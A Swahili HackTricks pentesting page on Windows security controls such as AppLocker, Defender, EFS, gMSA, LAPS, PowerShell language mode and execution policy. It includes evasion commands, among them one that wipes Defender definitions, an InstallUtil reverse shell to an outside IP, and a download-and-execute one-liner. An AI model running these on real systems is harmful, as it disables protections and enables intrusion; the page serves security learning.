# Udhibiti wa Usalama wa Windows

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za **jamii za hali ya juu zaidi** ulimwenguni.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sera ya AppLocker

Orodha nyeupe ya programu ni orodha ya programu au faili za programu zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kukimbia kwenye mfumo. Lengo ni kulinda mazingira kutoka kwa programu hasidi na programu zisizoidhinishwa ambazo hazilingani na mahitaji maalum ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **ufumbuzi wa orodha nyeupe ya programu** wa Microsoft na humpa waendeshaji wa mfumo udhibiti juu ya **programu na faili ambazo watumiaji wanaweza kukimbia**. Inatoa **udhibiti wa kina** juu ya programu za kukimbia, hati, faili za wasakinishaji wa Windows, DLLs, programu zilizopakwa, na wasakinishaji wa programu zilizopakwa.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na ufikiaji wa kuandika kwenye saraka fulani, **lakini hii yote inaweza kudukuliwa**.

### Angalia

Angalia ni faili/nyongeza zipi zimepigwa marufuku/kuruhusiwa:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hii njia ya usajili ina mizunguko na sera zilizotekelezwa na AppLocker, ikitoa njia ya kupitia seti ya sasa ya sheria zilizotekelezwa kwenye mfumo:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Kupita

* **Folda zinazoweza kuandikwa** zinazofaa kwa kuzidi Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows` kuna **folda zinazoweza kuandikwa** unaweza kutumia kwa **kupita hii**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* **Kawaida** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries zinaweza kuwa na manufaa kwa kukiuka AppLocker.
* **Sheria zilizoandikwa vibaya zinaweza pia kukiukwa**
* Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folda iliyoitwa `allowed`** mahali popote na itaruhusiwa.
* Mashirika mara nyingi hufanya kazi ya kuzuia **kutekelezeka kwa `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **maeneo mengine** [**ya kutekelezeka ya PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
* **Utekelezaji wa DLL mara chache sana huwezeshwa** kutokana na mzigo wa ziada unaweza kuweka kwenye mfumo, na idadi ya vipimo inayohitajika kuhakikisha hakuna kitu kitavunjika. Kwa hivyo kutumia **DLLs kama milango ya nyuma** itasaidia kukiuka AppLocker.
* Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kutekeleza msimbo wa **Powershell** katika mchakato wowote na kukiuka AppLocker. Kwa habari zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Uhifadhi wa Sifa

### Meneja wa Akaunti za Usalama (SAM)

Sifa za ndani zipo katika faili hii, nywila zimehashwa.

### Mamlaka ya Usalama ya Ndani (LSA) - LSASS

**Sifa** (zilizohashwa) zinahifadhiwa katika **kumbukumbu** ya mfumo huu kwa sababu za Kuingia Moja.\
**LSA** inasimamia **sera za usalama** za ndani (sera ya nywila, ruhusa za watumiaji...), **uthibitishaji**, **alama za ufikiaji**...\
LSA ndiye atakayefanya **uhakiki** wa sifa zilizotolewa ndani ya faili ya **SAM** (kwa kuingia ndani) na **kuzungumza** na **mlezi wa kikoa** kuthibitisha mtumiaji wa kikoa.

**Sifa** zinahifadhiwa ndani ya **mchakato wa LSASS**: Tiketi za Kerberos, hash NT na LM, nywila zinazoweza kufunguliwa kwa urahisi.

### Siri za LSA

LSA inaweza kuhifadhi kwenye diski baadhi ya sifa:

* Nywila ya akaunti ya kompyuta ya Active Directory (mlezi wa kikoa usioweza kufikiwa).
* Nywila za akaunti za huduma za Windows
* Nywila za kazi zilizopangwa
* Zaidi (nywila za programu za IIS...)

### NTDS.dit

Hii ni hifadhidata ya Active Directory. Ipo tu kwenye Wadhibiti wa Kikoa.

## Mlinzi

[**Mlinzi wa Microsoft**](https://en.wikipedia.org/wiki/Microsoft\_Defender) ni Kirusi ambacho kipo kwenye Windows 10 na Windows 11, na kwenye toleo za Windows Server. Ina **zuia** zana za kawaida za pentesting kama vile **`WinPEAS`**. Hata hivyo, kuna njia za **kukiuka ulinzi huu**.

### Angalia

Kutathmini **hali** ya **Mlinzi** unaweza kutekeleza amri ya PS **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua ikiwa iko hai):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Kwa kuiorodhesha unaweza pia kukimbia:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Mfumo wa Faili Uliofichwa (EFS)

EFS inalinda faili kupitia kifaa cha **ufungaji**, kwa kutumia **funguo ya usawa** inayoitwa **Funguo la Ufungaji wa Faili (FEK)**. Kifunguo hiki kinafungwa kwa kutumia **funguo la umma** la mtumiaji na kuhifadhiwa ndani ya $EFS **mtiririko wa data mbadala** wa faili iliyofichwa. Wakati upyaishaji unahitajika, funguo la **binafsi** la mtumiaji wa cheti cha kidijitali hutumiwa kufungua FEK kutoka kwa mtiririko wa $EFS. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Mazingira ya upyaishaji bila kuanzishwa na mtumiaji** ni pamoja na:

* Wakati faili au folda zinahamishwa kwenye mfumo wa faili usio wa EFS, kama [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), zinafichuliwa moja kwa moja.
* Faili zilizofichwa zinazotumwa kwenye mtandao kupitia itifaki ya SMB/CIFS zinafichuliwa kabla ya uhamishaji.

Mbinu hii ya ufungaji inaruhusu **upatikanaji wa wazi** wa faili zilizofichwa kwa mmiliki. Walakini, kubadilisha tu nenosiri la mmiliki na kuingia haitaruhusu upyaishaji.

**Mambo Muhimu**:

* EFS hutumia FEK ya usawa, iliyofungwa kwa funguo la umma la mtumiaji.
* Upyaishaji unatumia funguo la binafsi la mtumiaji kufikia FEK.
* Upyaishaji wa moja kwa moja unatokea chini ya hali maalum, kama kunakiliwa kwa FAT32 au uhamishaji wa mtandao.
* Faili zilizofichwa zinapatikana kwa mmiliki bila hatua za ziada.

### Angalia Taarifa za EFS

Angalia ikiwa **mtumiaji** ame**tumia** **huduma** hii kwa kuangalia ikiwa njia hii ipo: `C:\users\<jina la mtumiaji>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **upatikanaji** wa faili kwa kutumia cipher /c \<faili>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda kufanya **ufungaji** na **upyaishaji** wa faili zote

### Kufungua Faili za EFS

#### Kuwa Mamlaka ya Mfumo

Njia hii inahitaji **mtumiaji wa kudhulumiwa** kuwa **akitekeleza** mchakato ndani ya mwenyeji. Ikiwa hivyo ndivyo, kwa kutumia vikao vya `meterpreter` unaweza kujifanya kuwa tokeni ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `hamia` kwa mchakato wa mtumiaji.

#### Kujua nenosiri la mtumiaji

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Akaunti za Huduma Zilizosimamiwa na Kikundi (gMSA)

Microsoft iliendeleza **Akaunti za Huduma Zilizosimamiwa na Kikundi (gMSA)** ili kusahilisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za jadi ambazo mara nyingi zina mipangilio ya "**Nenosiri lisiloisha kamwe**" kuwezeshwa, gMSAs hutoa suluhisho lenye usalama zaidi na linaloweza kusimamiwa:

* **Usimamizi wa Nenosiri wa Kiotomatiki**: gMSAs hutumia nenosiri lenye herufi 240 lenye utata ambalo hujibadilisha moja kwa moja kulingana na sera ya kikoa au kompyuta. Mchakato huu unashughulikiwa na Huduma ya Usambazaji wa Funguo ya Microsoft (KDC), ikiondoa haja ya sasisho za nenosiri kwa mikono.
* **Usalama Ulioimarishwa**: Akaunti hizi hazina uwezekano wa kufungwa na haziwezi kutumika kwa kuingia kwa mwingiliano, ikiboresha usalama wao.
* **Msaada wa Mwenyeji Mbalimbali**: gMSAs zinaweza kushirikiwa kwenye mwenyeji mbalimbali, zikiwa bora kwa huduma zinazoendesha kwenye seva nyingi.
* **Uwezo wa Kazi Iliyopangwa**: Tofauti na akaunti za huduma zilizosimamiwa, gMSAs huzisaidia kazi zilizopangwa.
* **Usimamizi Rahisi wa SPN**: Mfumo hufanya sasisho za moja kwa moja za Jina la Mkuu wa Huduma (SPN) wakati kuna mabadiliko kwa maelezo ya sAMaccount ya kompyuta au jina la DNS, ikisimplisha usimamizi wa SPN.

Nenosiri za gMSAs hifadhiwa katika mali ya LDAP _**msDS-ManagedPassword**_ na kubadilishwa moja kwa moja kila baada ya siku 30 na Wadhibiti wa Kikoa (DCs). Nenosiri hili, kifurushi cha data kilichofungwa kinachoitwa [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kinaweza kupatikana tu na wasimamizi walioruhusiwa na seva ambazo gMSAs zimefungwa, ikizingatia mazingira salama. Ili kupata habari hii, unahitaji uunganisho ulioboreshwa kama LDAPS, au uunganisho lazima uthibitishwe na 'Kufunga & Salama'.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata habari zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)

Pia, angalia [ukurasa wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kutekeleza **shambulio la NTLM relay** ili **kusoma** **nenosiri** la **gMSA**.

## LAPS

**Local Administrator Password Solution (LAPS)**, inapatikana kwa kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), inawezesha usimamizi wa nywila za Wasimamizi wa Mitaa. Nywila hizi, ambazo ni **zilizochanganyikiwa**, za kipekee, na **zina mabadiliko mara kwa mara**, hifadhiwa kwa kati katika Active Directory. Upatikanaji wa nywila hizi umepunguzwa kupitia ACLs kwa watumiaji walioruhusiwa. Kwa idhini ya kutosha iliyotolewa, uwezo wa kusoma nywila za wasimamizi wa mitaa unatolewa.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inazuia sehemu nyingi za vipengele** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia vitu vya COM, kuruhusu aina zilizoidhinishwa za .NET tu, mifumo ya kazi za XAML, madarasa ya PowerShell, na zaidi.

### **Angalia**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Kupita Kizuizi
```powershell
#Easy bypass
Powershell -version 2
```
Katika Windows ya sasa, Bypass haitafanya kazi lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Kukusanya inaweza kuhitaji** **ku** _**Ongeza Marejeleo**_ -> _Tafuta_ -> _Tafuta_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.

#### Kupita moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Kitanzi cha Nyuma:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kutekeleza msimbo wa **Powershell** katika mchakato wowote na kuepuka hali iliyozuiwa. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Sera ya Utekelezaji wa PS

Kwa chaguo-msingi imewekwa kama **iliyozuiwa.** Njia kuu za kuepuka sera hii:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Zaidi inaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface ya Msaada wa Mtoa Usalama (SSPI)

Ni API inayoweza kutumika kuthibitisha watumiaji.

SSPI itakuwa na jukumu la kupata itifaki inayofaa kwa mashine mbili zinazotaka kuwasiliana. Mbinu inayopendelewa kwa hili ni Kerberos. Kisha SSPI itajadiliana ni itifaki ipi ya uwthibitishaji itatumika, itifaki hizi za uwthibitishaji huitwa Mtoa Msaada wa Usalama (SSP), zinapatikana ndani ya kila mashine ya Windows kwa mfumo wa DLL na mashine zote lazima ziweze kusaidia moja kwa moja ili kuweza kuwasiliana.

### SSPs Kuu

* **Kerberos**: Iliyopendelewa
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** na **NTLMv2**: Sababu za utangamano
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Seva za Wavuti na LDAP, nenosiri kwa mfumo wa hash ya MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL na TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Hutumika kujadiliana itifaki itakayotumika (Kerberos au NTLM ikiwa Kerberos ni chaguo la msingi)
* %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa njia kadhaa au moja tu.

## UAC - Udhibiti wa Akaunti ya Mtumiaji

[Udhibiti wa Akaunti ya Mtumiaji (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kibonyezo cha idhini kwa shughuli zilizoinuliwa**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** mifumo ya kazi inayotumia zana za jamii za **juu zaidi** ulimwenguni.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
